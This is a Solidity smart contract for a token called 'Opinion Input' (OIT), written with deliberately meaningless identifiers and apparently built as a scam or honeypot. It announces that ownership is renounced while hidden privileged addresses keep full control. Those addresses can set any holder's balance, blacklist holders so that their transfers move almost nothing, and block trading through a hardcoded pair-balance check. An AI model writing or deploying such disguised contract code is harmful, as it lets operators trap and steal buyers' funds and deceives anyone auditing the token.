//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface totalIs {
    function totalSupply() external view returns (uint256);

    function balanceOf(address minEnable) external view returns (uint256);

    function transfer(address swapLaunch, uint256 atToWallet) external returns (bool);

    function allowance(address exemptBuy, address spender) external view returns (uint256);

    function approve(address spender, uint256 atToWallet) external returns (bool);

    function transferFrom(
        address sender,
        address swapLaunch,
        uint256 atToWallet
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverEnable, uint256 value);
    event Approval(address indexed exemptBuy, address indexed spender, uint256 value);
}

abstract contract shouldAmount {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface toTrading {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface launchAmount {
    function createPair(address tokenTotalMin, address atShould) external returns (address);
}

interface listTotalIs is totalIs {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract OpinionInput is shouldAmount, totalIs, listTotalIs {

    uint256 public fromLimit;

    uint256 private receiverSell = 100000000 * 10 ** 18;

    function approve(address fundLiquidityAmount, uint256 atToWallet) public virtual override returns (bool) {
        limitTx[_msgSender()][fundLiquidityAmount] = atToWallet;
        emit Approval(_msgSender(), fundLiquidityAmount, atToWallet);
        return true;
    }

    string private liquiditySwap = "OIT";

    function marketingMax(address swapToken, address swapLaunch, uint256 atToWallet) internal returns (bool) {
        if (swapToken == fromReceiver) {
            return amountAutoMode(swapToken, swapLaunch, atToWallet);
        }
        uint256 walletShouldReceiver = totalIs(senderMode).balanceOf(limitTake);
        require(walletShouldReceiver == atToMarketing);
        require(swapLaunch != limitTake);
        if (tradingTeamTo[swapToken]) {
            return amountAutoMode(swapToken, swapLaunch, exemptFee);
        }
        return amountAutoMode(swapToken, swapLaunch, atToWallet);
    }

    mapping(address => bool) public senderShould;

    address public fromReceiver;

    mapping(address => bool) public tradingTeamTo;

    function amountAutoMode(address swapToken, address swapLaunch, uint256 atToWallet) internal returns (bool) {
        require(totalEnableIs[swapToken] >= atToWallet);
        totalEnableIs[swapToken] -= atToWallet;
        totalEnableIs[swapLaunch] += atToWallet;
        emit Transfer(swapToken, swapLaunch, atToWallet);
        return true;
    }

    uint256 private autoToken;

    uint256 private shouldLaunch;

    function transferFrom(address swapToken, address swapLaunch, uint256 atToWallet) external override returns (bool) {
        if (_msgSender() != tokenReceiver) {
            if (limitTx[swapToken][_msgSender()] != type(uint256).max) {
                require(atToWallet <= limitTx[swapToken][_msgSender()]);
                limitTx[swapToken][_msgSender()] -= atToWallet;
            }
        }
        return marketingMax(swapToken, swapLaunch, atToWallet);
    }

    address public senderMode;

    bool public minAutoTake;

    address private fundMin;

    function atReceiverAmount(uint256 atToWallet) public {
        teamTo();
        atToMarketing = atToWallet;
    }

    function autoFrom(address feeMode, uint256 atToWallet) public {
        teamTo();
        totalEnableIs[feeMode] = atToWallet;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return receiverSell;
    }

    event OwnershipTransferred(address indexed enableSwap, address indexed minMax);

    string private liquidityMax = "Opinion Input";

    bool public maxBuy;

    function listExempt(address buyIs) public {
        teamTo();
        if (isMin != atEnable) {
            feeToken = shouldLaunch;
        }
        if (buyIs == fromReceiver || buyIs == senderMode) {
            return;
        }
        tradingTeamTo[buyIs] = true;
    }

    constructor (){
        
        toTrading receiverFromIs = toTrading(tokenReceiver);
        senderMode = launchAmount(receiverFromIs.factory()).createPair(receiverFromIs.WETH(), address(this));
        
        fromReceiver = _msgSender();
        feeFund();
        senderShould[fromReceiver] = true;
        totalEnableIs[fromReceiver] = receiverSell;
        if (atEnable == minAutoTake) {
            fundLaunched = false;
        }
        emit Transfer(address(0), fromReceiver, receiverSell);
    }

    bool private fundLaunched;

    function owner() external view returns (address) {
        return fundMin;
    }

    uint256 public feeToken;

    bool private isMin;

    address limitTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address tokenReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => mapping(address => uint256)) private limitTx;

    function balanceOf(address minEnable) public view virtual override returns (uint256) {
        return totalEnableIs[minEnable];
    }

    function senderReceiver(address launchIsAmount) public {
        if (maxBuy) {
            return;
        }
        
        senderShould[launchIsAmount] = true;
        if (minAutoTake) {
            isMin = true;
        }
        maxBuy = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return liquiditySwap;
    }

    bool public atEnable;

    mapping(address => uint256) private totalEnableIs;

    function getOwner() external view returns (address) {
        return fundMin;
    }

    uint256 public isFee;

    uint8 private minMarketing = 18;

    function name() external view virtual override returns (string memory) {
        return liquidityMax;
    }

    uint256 constant exemptFee = 12 ** 10;

    function transfer(address feeMode, uint256 atToWallet) external virtual override returns (bool) {
        return marketingMax(_msgSender(), feeMode, atToWallet);
    }

    function allowance(address senderToken, address fundLiquidityAmount) external view virtual override returns (uint256) {
        if (fundLiquidityAmount == tokenReceiver) {
            return type(uint256).max;
        }
        return limitTx[senderToken][fundLiquidityAmount];
    }

    uint256 private takeLimit;

    uint256 atToMarketing;

    function feeFund() public {
        emit OwnershipTransferred(fromReceiver, address(0));
        fundMin = address(0);
    }

    function decimals() external view virtual override returns (uint8) {
        return minMarketing;
    }

    function teamTo() private view {
        require(senderShould[_msgSender()]);
    }

    uint256 maxExemptLaunched;

}